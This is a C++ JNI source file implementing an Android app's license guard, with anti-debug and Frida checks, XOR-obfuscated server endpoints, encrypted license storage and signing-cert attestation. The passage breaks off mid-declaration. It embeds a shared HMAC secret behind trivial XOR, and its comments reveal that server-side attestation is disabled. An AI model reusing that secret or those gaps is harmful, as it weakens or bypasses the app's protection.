




  #include <jni.h>
  #include <string>
  #include <vector>
  #include <cstring>
  #include <cstdio>
  #include <cstdlib>
  #include <sys/time.h>
  #include <android/log.h>

  #define LOG_TAG "fg_lic"
  #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
  #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)

  static jobject g_app_ctx = nullptr;  // application Context held as a global ref
  static void set_app_ctx(JNIEnv *env, jobject ctx){
      if(g_app_ctx){ env->DeleteGlobalRef(g_app_ctx); g_app_ctx=nullptr; }
      g_app_ctx = ctx ? env->NewGlobalRef(ctx) : nullptr;
  }



  static const uint8_t BASE_URL_OBF[] = {
    0x32, 0x2e, 0x2e, 0x2a, 0x29, 0x60, 0x75, 0x75,
    0x3f, 0x39, 0x35, 0x37, 0x39, 0x3b, 0x37, 0x74,
    0x39, 0x23, 0x35, 0x2f
};

  static const uint8_t EP_VALIDATE[] = {
      0x75,0x3b,0x2a,0x33,0x75,0x2c,0x3b,0x36,
      0x33,0x3e,0x3b,0x2e,0x3f,0x05,0x31,0x3f,0x23
  };

  static const uint8_t EP_VERIFY[] = {
      0x75,0x3b,0x2a,0x33,0x75,0x2c,0x3f,0x28,
      0x33,0x3c,0x23,0x05,0x2e,0x35,0x31,0x3f,0x34
  };

  static const uint8_t EP_ATTEST[] = {
      0x75,0x3B,0x2A,0x33,0x75,0x3B,0x2E,0x2E,0x3F,0x29,0x2E
  };

  static std::string xor_decode(const uint8_t *d, size_t n) {
      std::string r; r.reserve(n);
      for (size_t i = 0; i < n; i++) r += (char)(d[i] ^ 0x5A);
      return r;
  }


  static bool debugger_attached() {
      char buf[256] = {};
      FILE *f = fopen("/proc/self/status","r");
      if (!f) return false;
      while (fgets(buf, sizeof(buf), f)) {
          if (strncmp(buf,"TracerPid:",10)==0) { fclose(f); return atoi(buf+10)!=0; }
      }
      fclose(f); return false;
  }

  static bool frida_present() {
      FILE *f = fopen("/proc/self/maps","r");
      if (!f) return false;
      char line[512];
      while (fgets(line, sizeof(line), f)) {
          if (strstr(line,"frida")||strstr(line,"gum-js")||strstr(line,"linjector")) {
              fclose(f); return true;
          }
      }
      fclose(f); return false;
  }

  static bool tampered() { return debugger_attached() || frida_present(); }


  static std::string android_id(JNIEnv *env, jobject ctx) {
      jclass cSec = env->FindClass("android/provider/Settings$Secure");
      if (!cSec) { env->ExceptionClear(); return ""; }

      jmethodID mGet = env->GetStaticMethodID(cSec, "getString",
          "(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;");
      if (!mGet) { env->ExceptionClear(); env->DeleteLocalRef(cSec); return ""; }

      jclass cCtx = env->FindClass("android/content/Context");
      if (!cCtx) { env->ExceptionClear(); env->DeleteLocalRef(cSec); return ""; }

      jmethodID mCR = env->GetMethodID(cCtx, "getContentResolver",
          "()Landroid/content/ContentResolver;");
      env->DeleteLocalRef(cCtx);
      if (!mCR) { env->ExceptionClear(); env->DeleteLocalRef(cSec); return ""; }

      jobject cr = env->CallObjectMethod(ctx, mCR);
      if (!cr || env->ExceptionCheck()) {
          env->ExceptionClear(); env->DeleteLocalRef(cSec); return "";
      }

      jstring k  = env->NewStringUTF("android_id");
      jstring id = (jstring)env->CallStaticObjectMethod(cSec, mGet, cr, k);
      if (env->ExceptionCheck()) { env->ExceptionClear(); id = nullptr; }
      env->DeleteLocalRef(k);
      env->DeleteLocalRef(cr);
      env->DeleteLocalRef(cSec);

      if (!id) return "";
      const char *c = env->GetStringUTFChars(id, nullptr);
      std::string r(c ? c : "");
      if (c) env->ReleaseStringUTFChars(id, c);
      env->DeleteLocalRef(id);
      return r;
  }


  static const uint8_t SALT[] = {
      0xFA,0x3C,0x7E,0x11,0xB2,0x5D,0x98,0xC4,
      0x01,0x6A,0xE3,0x77,0x2F,0x8B,0x44,0xD9
  };

  static void xor_crypt(uint8_t *data, size_t len, const std::string &dk) {
      size_t kl=dk.size(), sl=sizeof(SALT);
      for (size_t i=0; i<len; i++)
          data[i] ^= ((uint8_t)dk[i%kl] ^ SALT[i%sl]);
  }

  static std::string lic_path(JNIEnv *env, jobject ctx) {

      static const char *FALLBACK = "/data/data/com.itsme.itsanon/files/fg_lic.bin";

      jclass cCtx = env->FindClass("android/content/Context");
      if (!cCtx) { env->ExceptionClear(); return FALLBACK; }

      jmethodID mFD = env->GetMethodID(cCtx, "getFilesDir", "()Ljava/io/File;");
      env->DeleteLocalRef(cCtx);
      if (!mFD) { env->ExceptionClear(); return FALLBACK; }

      jobject fd = env->CallObjectMethod(ctx, mFD);
      if (!fd || env->ExceptionCheck()) { env->ExceptionClear(); return FALLBACK; }

      jclass cF = env->FindClass("java/io/File");
      if (!cF) { env->ExceptionClear(); env->DeleteLocalRef(fd); return FALLBACK; }

      jmethodID mAP = env->GetMethodID(cF, "getAbsolutePath", "()Ljava/lang/String;");
      env->DeleteLocalRef(cF);
      if (!mAP) { env->ExceptionClear(); env->DeleteLocalRef(fd); return FALLBACK; }

      jstring jp = (jstring)env->CallObjectMethod(fd, mAP);
      if (env->ExceptionCheck()) { env->ExceptionClear(); jp = nullptr; }
      env->DeleteLocalRef(fd);

      if (!jp) return FALLBACK;
      const char *c = env->GetStringUTFChars(jp, nullptr);
      std::string p = std::string(c ? c : "/data/data/com.itsme.itsanon/files") + "/fg_lic.bin";
      if (c) env->ReleaseStringUTFChars(jp, c);
      env->DeleteLocalRef(jp);
      return p;
  }


  static bool lic_save(JNIEnv *env, jobject ctx,
      const std::string &tok, long exp, bool trial) {
      std::string dk = android_id(env, ctx);
      if (dk.empty()) dk = "FG_FALLBACK_2024";
      std::string plain = tok+"\x1F"+std::to_string(exp)+"\x1F"+(trial?"1":"0")+"\n";
      std::vector<uint8_t> buf(plain.begin(),plain.end());
      xor_crypt(buf.data(),buf.size(),dk);
      std::string p = lic_path(env, ctx);
      FILE *f = fopen(p.c_str(),"wb");
      if (!f) { LOGE("lic_save: fopen failed %s",p.c_str()); return false; }
      fwrite(buf.data(),1,buf.size(),f); fclose(f);
      LOGD("lic_save: ok len=%zu",buf.size());
      return true;
  }

  static bool lic_load(JNIEnv *env, jobject ctx,
      std::string &tok, long &exp, bool &trial) {
      std::string p = lic_path(env, ctx);
      FILE *f = fopen(p.c_str(),"rb");
      if (!f) return false;
      fseek(f,0,SEEK_END); long sz=ftell(f); fseek(f,0,SEEK_SET);
      if (sz<=0||sz>4096) { fclose(f); return false; }
      std::vector<uint8_t> buf(sz);
      fread(buf.data(),1,sz,f); fclose(f);
      std::string dk = android_id(env, ctx);
      if (dk.empty()) dk = "FG_FALLBACK_2024";
      xor_crypt(buf.data(),buf.size(),dk);
      std::string plain(buf.begin(),buf.end());
      size_t p1=plain.find('\x1F');
      if (p1==std::string::npos) return false;
      size_t p2=plain.find('\x1F',p1+1);
      if (p2==std::string::npos) return false;
      tok = plain.substr(0,p1);
      try { exp = std::stol(plain.substr(p1+1,p2-p1-1)); } catch(...) { return false; }
      trial = (plain.size()>p2+1 && plain[p2+1]=='1');
      return true;
  }



  static std::string jni_post(JNIEnv *env, const std::string &url, const std::string &body) {

      jclass cURL = env->FindClass("java/net/URL");
      if (!cURL) { env->ExceptionClear(); return ""; }
      jmethodID mURLInit = env->GetMethodID(cURL, "<init>", "(Ljava/lang/String;)V");
      if (!mURLInit) { env->ExceptionClear(); env->DeleteLocalRef(cURL); return ""; }
      jstring jurl = env->NewStringUTF(url.c_str());
      jobject uObj = env->NewObject(cURL, mURLInit, jurl);
      env->DeleteLocalRef(jurl);
      if (!uObj || env->ExceptionCheck()) {
          env->ExceptionClear(); env->DeleteLocalRef(cURL); return "";
      }


      jmethodID mOpenConn = env->GetMethodID(cURL, "openConnection",
                                              "()Ljava/net/URLConnection;");
      env->DeleteLocalRef(cURL);
      if (!mOpenConn) { env->ExceptionClear(); env->DeleteLocalRef(uObj); return ""; }
      jobject conn = env->CallObjectMethod(uObj, mOpenConn);
      env->DeleteLocalRef(uObj);
      if (!conn || env->ExceptionCheck()) { env->ExceptionClear(); return ""; }

      jclass cHC = env->FindClass("java/net/HttpURLConnection");
      if (!cHC) {
          env->ExceptionClear(); env->DeleteLocalRef(conn); return "";
      }


      jmethodID mSetMethod = env->GetMethodID(cHC, "setRequestMethod",
                                               "(Ljava/lang/String;)V");
      if (mSetMethod) {
          jstring jPOST = env->NewStringUTF("POST");
          env->CallVoidMethod(conn, mSetMethod, jPOST);
          if (env->ExceptionCheck()) env->ExceptionClear();
          env->DeleteLocalRef(jPOST);
      } else { env->ExceptionClear(); }


      jmethodID mSetDO = env->GetMethodID(cHC, "setDoOutput", "(Z)V");
      if (mSetDO) { env->CallVoidMethod(conn, mSetDO, JNI_TRUE); if (env->ExceptionCheck()) env->ExceptionClear(); }
      else env->ExceptionClear();


      jmethodID mSRP = env->GetMethodID(cHC, "setRequestProperty",
                                          "(Ljava/lang/String;Ljava/lang/String;)V");
      if (mSRP) {
          auto hdr = [&](const char *k, const char *v) {
              jstring jk = env->NewStringUTF(k), jv = env->NewStringUTF(v);
              env->CallVoidMethod(conn, mSRP, jk, jv);
              if (env->ExceptionCheck()) env->ExceptionClear();
              env->DeleteLocalRef(jk); env->DeleteLocalRef(jv);
          };
          hdr("Content-Type", "application/json");
          hdr("User-Agent",   "Dalvik/2.1.0 (Linux; Android)");
      } else { env->ExceptionClear(); }


      jmethodID mCT = env->GetMethodID(cHC, "setConnectTimeout", "(I)V");
      jmethodID mRT = env->GetMethodID(cHC, "setReadTimeout",    "(I)V");
      if (mCT) { env->CallVoidMethod(conn, mCT, (jint)30000); if (env->ExceptionCheck()) env->ExceptionClear(); }
      else env->ExceptionClear();
      if (mRT) { env->CallVoidMethod(conn, mRT, (jint)30000); if (env->ExceptionCheck()) env->ExceptionClear(); }
      else env->ExceptionClear();


      jmethodID mGetOS = env->GetMethodID(cHC, "getOutputStream", "()Ljava/io/OutputStream;");
      if (!mGetOS) { env->ExceptionClear(); env->DeleteLocalRef(cHC); env->DeleteLocalRef(conn); return ""; }
      jobject os = env->CallObjectMethod(conn, mGetOS);
      if (!os || env->ExceptionCheck()) { env->ExceptionClear(); env->DeleteLocalRef(cHC); env->DeleteLocalRef(conn); return ""; }

      jclass cOS = env->FindClass("java/io/OutputStream");
      if (cOS) {
          jbyteArray ba = env->NewByteArray((jsize)body.size());
          if (ba) {
              env->SetByteArrayRegion(ba, 0, (jsize)body.size(), (const jbyte*)body.data());
              jmethodID mWrite = env->GetMethodID(cOS, "write", "([B)V");
              jmethodID mFlush = env->GetMethodID(cOS, "flush", "()V");
              jmethodID mClose = env->GetMethodID(cOS, "close", "()V");
              if (mWrite) { env->CallVoidMethod(os, mWrite, ba); if (env->ExceptionCheck()) env->ExceptionClear(); }
              else env->ExceptionClear();
              if (mFlush) { env->CallVoidMethod(os, mFlush);     if (env->ExceptionCheck()) env->ExceptionClear(); }
              else env->ExceptionClear();
              if (mClose) { env->CallVoidMethod(os, mClose);     if (env->ExceptionCheck()) env->ExceptionClear(); }
              else env->ExceptionClear();
              env->DeleteLocalRef(ba);
          }
          env->DeleteLocalRef(cOS);
      } else { env->ExceptionClear(); }
      env->DeleteLocalRef(os);


      if (env->ExceptionCheck()) { env->ExceptionClear(); env->DeleteLocalRef(cHC); env->DeleteLocalRef(conn); return ""; }

      jmethodID mGetIS = env->GetMethodID(cHC, "getInputStream", "()Ljava/io/InputStream;");
      if (!mGetIS) { env->ExceptionClear(); env->DeleteLocalRef(cHC); env->DeleteLocalRef(conn); return ""; }
      jobject is = env->CallObjectMethod(conn, mGetIS);
      if (!is || env->ExceptionCheck()) { env->ExceptionClear(); env->DeleteLocalRef(cHC); env->DeleteLocalRef(conn); return ""; }

      jclass cISR = env->FindClass("java/io/InputStreamReader");
      if (!cISR) { env->ExceptionClear(); env->DeleteLocalRef(is); env->DeleteLocalRef(cHC); env->DeleteLocalRef(conn); return ""; }
      jmethodID mISRInit = env->GetMethodID(cISR, "<init>", "(Ljava/io/InputStream;)V");
      if (!mISRInit) { env->ExceptionClear(); env->DeleteLocalRef(cISR); env->DeleteLocalRef(is); env->DeleteLocalRef(cHC); env->DeleteLocalRef(conn); return ""; }
      jobject isr = env->NewObject(cISR, mISRInit, is);
      env->DeleteLocalRef(cISR);
      if (!isr || env->ExceptionCheck()) { env->ExceptionClear(); env->DeleteLocalRef(is); env->DeleteLocalRef(cHC); env->DeleteLocalRef(conn); return ""; }

      jclass cBR = env->FindClass("java/io/BufferedReader");
      if (!cBR) { env->ExceptionClear(); env->DeleteLocalRef(isr); env->DeleteLocalRef(is); env->DeleteLocalRef(cHC); env->DeleteLocalRef(conn); return ""; }
      jmethodID mBRInit = env->GetMethodID(cBR, "<init>", "(Ljava/io/Reader;)V");
      if (!mBRInit) { env->ExceptionClear(); env->DeleteLocalRef(cBR); env->DeleteLocalRef(isr); env->DeleteLocalRef(is); env->DeleteLocalRef(cHC); env->DeleteLocalRef(conn); return ""; }
      jobject br = env->NewObject(cBR, mBRInit, isr);
      env->DeleteLocalRef(isr);
      if (!br || env->ExceptionCheck()) { env->ExceptionClear(); env->DeleteLocalRef(cBR); env->DeleteLocalRef(is); env->DeleteLocalRef(cHC); env->DeleteLocalRef(conn); return ""; }
      jmethodID mRL = env->GetMethodID(cBR, "readLine", "()Ljava/lang/String;");
      env->DeleteLocalRef(cBR);
      if (!mRL) { env->ExceptionClear(); env->DeleteLocalRef(br); env->DeleteLocalRef(is); env->DeleteLocalRef(cHC); env->DeleteLocalRef(conn); return ""; }

      std::string resp;
      while (true) {
          jstring line = (jstring)env->CallObjectMethod(br,mRL);
          if (!line||env->ExceptionCheck()) { env->ExceptionClear(); break; }
          const char *ch = env->GetStringUTFChars(line,nullptr);
          resp += ch; env->ReleaseStringUTFChars(line,ch);
          env->DeleteLocalRef(line);
      }
      env->DeleteLocalRef(br);

      env->DeleteLocalRef(is);
      jmethodID mDisc = env->GetMethodID(cHC, "disconnect", "()V");
      if (mDisc) { env->CallVoidMethod(conn, mDisc); if (env->ExceptionCheck()) env->ExceptionClear(); }
      else env->ExceptionClear();
      env->DeleteLocalRef(cHC);
      env->DeleteLocalRef(conn);
      return resp;
  }








  // ── SHA-256 + HMAC-SHA256 (self-contained, no openssl dep) ────────────────
  static const uint32_t K_256[64] = {
      0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
      0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
      0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
      0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
      0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
      0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
      0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
      0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
  };
  static inline uint32_t _rotr(uint32_t x, int n){ return (x>>n)|(x<<(32-n)); }
  static void sha256(const uint8_t *in, size_t len, uint8_t out[32]) {
      uint32_t h[8]={0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19};
      size_t bitlen = len*8;
      size_t padlen = ((len+8)/64+1)*64;
      std::vector<uint8_t> m(padlen,0);
      memcpy(m.data(), in, len);
      m[len]=0x80;
      for(int i=0;i<8;i++) m[padlen-1-i]=(uint8_t)(bitlen>>(i*8));
      for(size_t off=0; off<padlen; off+=64){
          uint32_t w[64];
          for(int i=0;i<16;i++)
              w[i]=(m[off+i*4]<<24)|(m[off+i*4+1]<<16)|(m[off+i*4+2]<<8)|m[off+i*4+3];
          for(int i=16;i<64;i++){
              uint32_t s0=_rotr(w[i-15],7)^_rotr(w[i-15],18)^(w[i-15]>>3);
              uint32_t s1=_rotr(w[i-2],17)^_rotr(w[i-2],19)^(w[i-2]>>10);
              w[i]=w[i-16]+s0+w[i-7]+s1;
          }
          uint32_t a=h[0],b=h[1],c=h[2],d=h[3],e=h[4],f=h[5],g=h[6],hh=h[7];
          for(int i=0;i<64;i++){
              uint32_t S1=_rotr(e,6)^_rotr(e,11)^_rotr(e,25);
              uint32_t ch=(e&f)^((~e)&g);
              uint32_t t1=hh+S1+ch+K_256[i]+w[i];
              uint32_t S0=_rotr(a,2)^_rotr(a,13)^_rotr(a,22);
              uint32_t maj=(a&b)^(a&c)^(b&c);
              uint32_t t2=S0+maj;
              hh=g; g=f; f=e; e=d+t1; d=c; c=b; b=a; a=t1+t2;
          }
          h[0]+=a;h[1]+=b;h[2]+=c;h[3]+=d;h[4]+=e;h[5]+=f;h[6]+=g;h[7]+=hh;
      }
      for(int i=0;i<8;i++){ out[i*4]=(h[i]>>24)&0xff; out[i*4+1]=(h[i]>>16)&0xff; out[i*4+2]=(h[i]>>8)&0xff; out[i*4+3]=h[i]&0xff; }
  }
  static void hmac_sha256(const uint8_t *key, size_t keylen, const uint8_t *msg, size_t msglen, uint8_t out[32]) {
      uint8_t k[64]={0};
      if(keylen>64){ uint8_t hk[32]; sha256(key,keylen,hk); memcpy(k,hk,32); }
      else memcpy(k,key,keylen);
      uint8_t ipad[64],opad[64];
      for(int i=0;i<64;i++){ ipad[i]=k[i]^0x36; opad[i]=k[i]^0x5c; }
      std::vector<uint8_t> inner(64+msglen);
      memcpy(inner.data(),ipad,64); memcpy(inner.data()+64,msg,msglen);
      uint8_t ih[32]; sha256(inner.data(),inner.size(),ih);
      std::vector<uint8_t> outer(64+32);
      memcpy(outer.data(),opad,64); memcpy(outer.data()+64,ih,32);
      sha256(outer.data(),outer.size(),out);
  }
  static std::string to_hex(const uint8_t *d, size_t n){
      const char* hx="0123456789abcdef"; std::string s; s.reserve(n*2);
      for(size_t i=0;i<n;i++){ s+=hx[d[i]>>4]; s+=hx[d[i]&0xf]; }
      return s;
  }

  // Signing-cert hash of the installed APK (SHA-256 of the raw signature bytes).
  static std::string app_cert_hash(JNIEnv *env, jobject ctx){
      std::string out;
      if(!env || !ctx) return out;
      jclass cPM = env->FindClass("android/content/pm/PackageManager");
      jclass cCtx = env->FindClass("android/content/Context");
      if(!cPM||!cCtx){ env->ExceptionClear(); return out; }
      jmethodID mGetPM = env->GetMethodID(cCtx,"getPackageManager","()Landroid/content/pm/PackageManager;");
      jmethodID mGetPkg = env->GetMethodID(cPM,"getPackageInfo","(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;");
      jmethodID mGetName = env->GetMethodID(cCtx,"getPackageName","()Ljava/lang/String;");
      if(!mGetPM||!mGetPkg||!mGetName){ env->ExceptionClear(); env->DeleteLocalRef(cPM); env->DeleteLocalRef(cCtx); return out; }
      jobject pm = env->CallObjectMethod(ctx,mGetPM);
      if(!pm||env->ExceptionCheck()){ env->ExceptionClear(); env->DeleteLocalRef(cPM); env->DeleteLocalRef(cCtx); return out; }
      jstring jpkg = (jstring)env->CallObjectMethod(ctx,mGetName);
      if(!jpkg||env->ExceptionCheck()){ env->ExceptionClear(); env->DeleteLocalRef(pm); env->DeleteLocalRef(cPM); env->DeleteLocalRef(cCtx); return out; }
      jobject pkgInfo = env->CallObjectMethod(pm,mGetPkg,jpkg,64 /*GET_SIGNATURES*/);
      env->DeleteLocalRef(jpkg); env->DeleteLocalRef(pm);
      if(!pkgInfo||env->ExceptionCheck()){ env->ExceptionClear(); env->DeleteLocalRef(cPM); env->DeleteLocalRef(cCtx); return out; }
      jclass cPkgInfo = env->GetObjectClass(pkgInfo);
      jfieldID fSign = env->GetFieldID(cPkgInfo,"signatures","[Landroid/content/pm/Signature;");
      if(!fSign){ env->ExceptionClear(); env->DeleteLocalRef(cPkgInfo); env->DeleteLocalRef(pkgInfo); env->DeleteLocalRef(cPM); env->DeleteLocalRef(cCtx); return out; }
      jobjectArray sigs = (jobjectArray)env->GetObjectField(pkgInfo,fSign);
      if(!sigs){ env->ExceptionClear(); env->DeleteLocalRef(cPkgInfo); env->DeleteLocalRef(pkgInfo); env->DeleteLocalRef(cPM); env->DeleteLocalRef(cCtx); return out; }
      jsize n = env->GetArrayLength(sigs);
      if(n>0){
          jobject sig0 = env->GetObjectArrayElement(sigs,0);
          jclass cSig = env->GetObjectClass(sig0);
          jmethodID mBytes = env->GetMethodID(cSig,"toByteArray","()[B");
          jbyteArray ba = (jbyteArray)env->CallObjectMethod(sig0,mBytes);
          if(ba&&!env->ExceptionCheck()){
              jsize blen = env->GetArrayLength(ba);
              jbyte* b = env->GetByteArrayElements(ba,nullptr);
              uint8_t dig[32]; sha256((uint8_t*)b,blen,dig);
              env->ReleaseByteArrayElements(ba,b,JNI_ABORT);
              out = to_hex(dig,32);
          }
          env->DeleteLocalRef(ba); env->DeleteLocalRef(cSig); env->DeleteLocalRef(sig0);
      }
      env->DeleteLocalRef(sigs); env->DeleteLocalRef(cPkgInfo); env->DeleteLocalRef(pkgInfo);
      env->DeleteLocalRef(cPM); env->DeleteLocalRef(cCtx);
      return out;
  }

  // Attestation secret (also held server-side in FaceGate_Server env). xor 0x5A.
  static const uint8_t ATTEST_SECRET[] = {
      0x05,0x1D,0x1B,0x0E,0x1F,0x05,0x1B,0x0E,0x0E,0x1F,0x09,0x0E,0x05,0x09,0x1F,0x19,
      0x08,0x1F,0x0E,0x05,0x68,0x6A,0x68,0x6E,0x05,0x1B,0x2E,0x2E,0x11,0x3F,0x23,0x7B
  };
  static std::string attest_secret(){
      // xor 0x5A to reveal plaintext secret
      std::string s; for(auto b: ATTEST_SECRET) s+=(char)(b^0x5A);
      return s;
  }
  // [V27] SHA-256 (hex, lowercase) of the release_v18.jks signing cert, xor 0x5A.
  // Verified in-repo: keytool prints 4F:11:E4:2E:95:6F:EA:98:B7:9C:5C:08:A7:52:
  // D3:2F:4C:44:D8:DD:A3:11:83:8F:05:1B:BA:34:29:FC:FA:AE. The server-side
  // /api/attest currently answers valid:true for ANY cert ("attestation_disabled"),
  // so the client enforces the fingerprint itself, fail closed.
  static const uint8_t EXPECTED_CERT_HEX[] = {
      0x6E, 0x3C, 0x6B, 0x6B, 0x3F, 0x6E, 0x68, 0x3F, 0x63, 0x6F, 0x6C, 0x3C, 0x3F, 0x3B, 0x63, 0x62,
      0x38, 0x6D, 0x63, 0x39, 0x6F, 0x39, 0x6A, 0x62, 0x3B, 0x6D, 0x6F, 0x68, 0x3E, 0x69, 0x68, 0x3C,
      0x6E, 0x39, 0x6E, 0x6E, 0x3E, 0x62, 0x3E, 0x3E, 0x3B, 0x69, 0x6B, 0x6B, 0x62, 0x69, 0x62, 0x3C,
      0x6A, 0x6F, 0x6B, 0x38, 0x38, 0x3B, 0x69, 0x6E, 0x68, 0x63, 0x3C, 0x39, 0x3C, 0x3B, 0x3B, 0x3F,
  };
  static std::string expected_cert_hex(){
      std::string s; for(auto b: EXPECTED_CERT_HEX) s+=(char)(b^0x5A);
      return s;
  }
  // Compute HMAC-SHA256(secret, device_id + ":" + cert_hash) hex.
  static std::string attest_hmac(const std::string &device, const std::string &cert){
      std::string secret = attest_secret();
      std::string msg = device + ":" + cert;
      uint8_t mac[32];
      hmac_sha256((uint8_t*)secret.data(), secret.size(), (uint8_t*)msg.data(), msg.size(), mac);
      return to_hex(mac,32);
  }


  static std::string sanitize_for_jni_utf(const std::string &in) {
      std::string out; out.reserve(in.size());
      for (unsigned char c : in) {
          if (c >= 0x20 && c < 0x7F)      out += (char)c;
          else if (c == '\n' || c == '\t') out += (char)c;
          else                             out += '?';
      }
      return out;
  }

  extern "C" {

  JNIEXPORT void JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeSetAppContext(
      JNIEnv *env, jobject, jobject ctx) {
      set_app_ctx(env, ctx);
  }

  JNIEXPORT jstring JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeValidateKey(
      JNIEnv *env, jobject, jstring jKey, jstring jDeviceId, jstring jWifiIp) {
      if (tampered())
          return env->NewStringUTF("{\"success\":false,\"message\":\"Security check failed\",\"token\":null}");

      const char *key=env->GetStringUTFChars(jKey,nullptr);
      const char *did=env->GetStringUTFChars(jDeviceId,nullptr);
      const char *wip=jWifiIp?env->GetStringUTFChars(jWifiIp,nullptr):nullptr;

      std::string json="{\"key\":\""+std::string(key)+
                        "\",\"device_id\":\""+std::string(did)+"\"";
      if (wip&&strlen(wip)>0) json+=",\"wifi_ip\":\""+std::string(wip)+"\"";
      // attestation: signing-cert hash + HMAC(device:cert)
      std::string cert = app_cert_hash(env, g_app_ctx);
      if(!cert.empty()){
          json+=",\"cert_hash\":\""+cert+"\"";
          json+=",\"attest\":\""+attest_hmac(std::string(did), cert)+"\"";
      }
      json+="}";

      env->ReleaseStringUTFChars(jKey,key);
      env->ReleaseStringUTFChars(jDeviceId,did);
      if (jWifiIp&&wip) env->ReleaseStringUTFChars(jWifiIp,wip);

      std::string url=xor_decode(BASE_URL_OBF,sizeof(BASE_URL_OBF))
                     +xor_decode(EP_VALIDATE,sizeof(EP_VALIDATE));
      std::string res=jni_post(env,url,json);
      if (res.empty()) res="{\"success\":false,\"message\":\"Network error\",\"token\":null}";
      LOGD("validateKey resp len=%zu",res.size());
      return env->NewStringUTF(sanitize_for_jni_utf(res).c_str());
  }

  JNIEXPORT jstring JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeVerifyToken(
      JNIEnv *env, jobject, jstring jToken, jstring jDeviceId) {
      if (tampered())
          return env->NewStringUTF("{\"valid\":false,\"message\":\"Security check failed\"}");

      const char *tok=env->GetStringUTFChars(jToken,nullptr);
      const char *did=env->GetStringUTFChars(jDeviceId,nullptr);
      std::string json="{\"token\":\""+std::string(tok)+
                        "\",\"device_id\":\""+std::string(did)+"\"";
      std::string cert = app_cert_hash(env, g_app_ctx);
      if(!cert.empty()){
          json+=",\"cert_hash\":\""+cert+"\"";
          json+=",\"attest\":\""+attest_hmac(std::string(did), cert)+"\"";
      }
      json+="}" ;
      env->ReleaseStringUTFChars(jToken,tok);
      env->ReleaseStringUTFChars(jDeviceId,did);

      std::string url=xor_decode(BASE_URL_OBF,sizeof(BASE_URL_OBF))
                     +xor_decode(EP_VERIFY,sizeof(EP_VERIFY));
      std::string res=jni_post(env,url,json);
      if (res.empty()) res="{\"valid\":false,\"message\":\"Network error\"}";
      return env->NewStringUTF(sanitize_for_jni_utf(res).c_str());
  }

  JNIEXPORT jboolean JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeIsActivated(
      JNIEnv *env, jobject, jobject ctx) {
      if (tampered()) return JNI_FALSE;
      std::string tok; long exp=0; bool trial=false;
      if (!lic_load(env,ctx,tok,exp,trial)||tok.empty()) return JNI_FALSE;
      if (exp>0) {
          struct timeval tv{}; gettimeofday(&tv,nullptr);
          long now=(long)tv.tv_sec*1000L+(long)tv.tv_usec/1000L;
          if (now>exp) { LOGD("nativeIsActivated: expired"); return JNI_FALSE; }
      }
      return JNI_TRUE;
  }

  JNIEXPORT jboolean JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeSaveActivation(
      JNIEnv *env, jobject, jobject ctx, jstring jTok, jboolean trial, jlong expMs) {
      const char *t=env->GetStringUTFChars(jTok,nullptr);
      bool ok=lic_save(env,ctx,std::string(t),(long)expMs,(bool)trial);
      env->ReleaseStringUTFChars(jTok,t);
      return ok?JNI_TRUE:JNI_FALSE;
  }

  JNIEXPORT void JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeClearActivation(
      JNIEnv *env, jobject, jobject ctx) {
      remove(lic_path(env,ctx).c_str());
  }

  JNIEXPORT jboolean JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeSecurityCheck(
      JNIEnv *env, jobject) {
      return tampered()?JNI_FALSE:JNI_TRUE;
  }

  // Attestation check at app startup: POST cert_hash + HMAC to /api/attest and
  // return whether the app's signing cert is the expected (production) one.
  // Returns JNI_FALSE on a repackaged/re-signed clone so the app can warn+exit.
  JNIEXPORT jboolean JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeCheckAttestation(
      JNIEnv *env, jobject) {
      if (tampered()) return JNI_FALSE;
      std::string did = android_id(env, g_app_ctx);
      std::string cert = app_cert_hash(env, g_app_ctx);
      if (did.empty() || cert.empty()) return JNI_FALSE; // can't verify -> fail closed
      // [V27] Local signing-cert gate: a repackaged/re-signed APK has a
      // different cert hash and must die here, even with the server's
      // attestation disabled. The server round-trip below stays as a
      // second layer (and will re-enforce once the server re-enables it).
      if (cert != expected_cert_hex()) {
          LOGD("checkAttestation: LOCAL cert mismatch (re-signed APK) — fail closed");
          return JNI_FALSE;
      }
      std::string json="{\"device_id\":\""+did+"\",\"cert_hash\":\""+cert+
                        "\",\"attest\":\""+attest_hmac(did, cert)+"\"}";
      std::string url=xor_decode(BASE_URL_OBF,sizeof(BASE_URL_OBF))
                     +xor_decode(EP_ATTEST,sizeof(EP_ATTEST));
      std::string res=jni_post(env,url,json);
      if (res.empty()) {
          // Network failure: fail OPEN here (heartbeat/verify still enforce later),
          // so legitimate users aren't locked out while offline.
          LOGD("checkAttestation: network error, fail open");
          return JNI_TRUE;
      }
      return res.find("\"valid\":true")!=std::string::npos ? JNI_TRUE : JNI_FALSE;
  }




  JNIEXPORT jstring JNICALL
